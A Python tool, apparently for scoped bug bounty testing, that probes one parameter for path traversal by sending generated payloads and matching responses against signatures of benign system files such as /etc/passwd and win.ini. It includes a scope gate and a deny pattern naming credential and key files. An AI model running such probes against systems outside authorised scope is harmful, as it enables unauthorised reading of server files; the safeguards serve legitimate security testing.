#!/usr/bin/env python3
"""Scope-gated path traversal / LFI probe for one injection point (class R proof only).

Usage:
  traversal_probe.py --target example.com --url 'https://app.example.com/download?file=FUZZ'
                     [--data 'path=FUZZ'] [--header 'Cookie: lang=FUZZ'] [--method GET|POST]
                     [--os linux|windows|any] [--file etc/passwd] [--families plain,url,...] [--depth 8]
                     [--prefix /var/www/images/] [--suffix .png] [--delay 0.5] [--max 200] [--no-stop]
                     [--out artifacts/path_traversal/probe.tsv] [--insecure]

FUZZ may appear in the URL (query or path), --data body, or one --header. Payloads come from
traversal_payloads.py. Detection uses fixed signatures for benign proof files only
(/etc/passwd, /etc/hosts, /etc/group, /etc/issue, /etc/os-release, /proc/version, win.ini, hosts).
Sensitive targets (shadow, keys, credentials, environ, configs) are refused.
Each family stops after its first hit unless --no-stop. Evidence keeps only the first matching line.
"""
import argparse
import importlib.util
import os
import random
import re
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import urlsplit

SIGNATURES = {
    "etc/passwd": r"root:[^:\n]*:0:0:",
    "etc/group": r"root:[^:\n]*:0:",
    "etc/hosts": r"(127\.0\.0\.1|::1)\s+localhost",
    "etc/issue": r"(Ubuntu|Debian|CentOS|Red Hat|Alpine|Fedora|Amazon Linux)",
    "etc/os-release": r"^(NAME|ID)=",
    "proc/version": r"Linux version \d",
    "windows/win.ini": r"(\[fonts\]|for 16-bit app support|\[extensions\])",
    "windows/system32/drivers/etc/hosts": r"(127\.0\.0\.1|::1)\s+localhost",
}
SENSITIVE = re.compile(r"(shadow|id_rsa|id_ed25519|\.ssh|\.aws|credentials|serviceaccount|environ|/sam$|\\sam$|"
                       r"web\.config|\.env|wp-config|tomcat-users|my\.cnf|\.pem|\.key$|secrets)", re.I)


def load_generator():
    here = os.path.dirname(os.path.abspath(__file__))
    spec = importlib.util.spec_from_file_location("traversal_payloads", os.path.join(here, "traversal_payloads.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def gate(host):
    here = os.path.dirname(os.path.abspath(__file__))
    script = os.path.normpath(os.path.join(here, "..", "..", "..", "..", "scripts", "scope_check.sh"))
    try:
        r = subprocess.run(["bash", script, host], capture_output=True, text=True)
    except FileNotFoundError:
        sys.exit("bash not found; cannot run scope gate")
    sys.stderr.write((r.stdout + r.stderr).strip() + "\n")
    if r.returncode != 0:
        sys.exit(r.returncode)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def send(opener, method, url, headers, body):
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with opener.open(req, timeout=20) as r:
            return r.status, r.read(2_000_000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(2_000_000)
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--data")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--method")
    ap.add_argument("--content-type", default="application/x-www-form-urlencoded")
    ap.add_argument("--os", default="linux", choices=["linux", "windows", "any"])
    ap.add_argument("--file")
    ap.add_argument("--families")
    ap.add_argument("--depth", type=int, default=8)
    ap.add_argument("--prefix")
    ap.add_argument("--suffix")
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--max", type=int, default=200)
    ap.add_argument("--no-stop", action="store_true")
    ap.add_argument("--out", default="artifacts/path_traversal/probe.tsv")
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()

    where = [x for x in ("url", "data") if "FUZZ" in (getattr(a, x) or "")] + \
            [f"header:{h}" for h in a.header if "FUZZ" in h]
    if len(where) != 1:
        sys.exit("exactly one of --url / --data / --header must contain FUZZ")
    files = [a.file.lstrip("/\\").lower()] if a.file else (
        ["etc/passwd"] if a.os == "linux" else ["windows/win.ini"] if a.os == "windows" else ["etc/passwd", "windows/win.ini"])
    for f in files:
        if SENSITIVE.search(f):
            sys.exit(f"refusing sensitive target '{f}' (class S/I) - prove reachability with a benign file instead")
        if f not in SIGNATURES:
            sys.exit(f"no proof signature for '{f}'; choose one of: {', '.join(SIGNATURES)}")

    host = (urlsplit(a.url).hostname or "").lower()
    t = a.target.lower()
    if host != t and not host.endswith("." + t):
        sys.exit(f"URL host {host} outside target {a.target}")
    gate(host)

    gen = load_generator()
    fams = {x.strip() for x in a.families.split(",")} if a.families else None
    payloads = []
    for f in files:
        osn = "windows" if f.startswith("windows/") else ("linux" if a.os == "any" else a.os)
        for fam, p in gen.build(osn, f, a.depth, a.prefix, a.suffix, False, None, []):
            if fams and fam not in fams and fam.split("-")[0] not in fams:
                continue
            payloads.append((f, fam, p))
    seen, uniq = set(), []
    for x in payloads:
        if x[2] not in seen:
            seen.add(x[2])
            uniq.append(x)
    payloads = uniq[: a.max]

    ctx = ssl.create_default_context()
    if a.insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    method = (a.method or ("POST" if a.data else "GET")).upper()
    base_headers = {"User-Agent": "bbtest-traversal/1.0"}
    if a.data:
        base_headers["Content-Type"] = a.content_type

    def request(value):
        url = a.url.replace("FUZZ", value)
        body = a.data.replace("FUZZ", value).encode() if a.data else None
        hdrs = dict(base_headers)
        for h in a.header:
            k, _, v = h.partition(":")
            hdrs[k.strip()] = v.strip().replace("FUZZ", value)
        return send(opener, method, url, hdrs, body)

    bcode, bbody = request(f"bbtest_nonexistent_{random.randint(10**6, 10**7)}")
    print(f"[*] baseline (nonexistent): {bcode} {len(bbody)} bytes; {len(payloads)} payloads; method {method}", file=sys.stderr)
    if bcode == 0:
        sys.exit(f"target unreachable: {bbody.decode('utf-8', 'replace')[:120]}")
    done_fams, rows, hits, errors = set(), [], 0, 0
    for f, fam, p in payloads:
        if not a.no_stop and (f, fam) in done_fams:
            continue
        code, body = request(p)
        errors = errors + 1 if code == 0 else 0
        if errors >= 5:
            print("[!] 5 consecutive connection errors - target down or blocking; stopping.", file=sys.stderr)
            break
        text = body.decode("utf-8", "replace")
        m = re.search(SIGNATURES[f], text, re.M)
        ev = ""
        if m:
            line_start = text.rfind("\n", 0, m.start()) + 1
            line_end = text.find("\n", m.end())
            ev = text[line_start: line_end if line_end != -1 else None][:200].strip()
            hits += 1
            done_fams.add((f, fam))
            print(f"!! HIT {fam:<14} {code} {len(body):>7}  {p[:90]}  ->  {ev[:80]}")
        rows.append((f, fam, p, code, len(body), "HIT" if m else "", ev))
        time.sleep(a.delay)

    os.makedirs(os.path.dirname(a.out) or ".", exist_ok=True)
    with open(a.out, "w", encoding="utf-8") as fh:
        fh.write("target_file\tfamily\tpayload\tstatus\tbytes\thit\tevidence_first_line\n")
        for r in rows:
            fh.write("\t".join(str(x).replace("\t", " ") for x in r) + "\n")
    print(f"[+] {len(rows)} requests, {hits} hits -> {a.out}")
    if not hits:
        print("    No signature hits. Check status/size differences vs baseline in the TSV (PT-38 blind confirmation).")


if __name__ == "__main__":
    main()
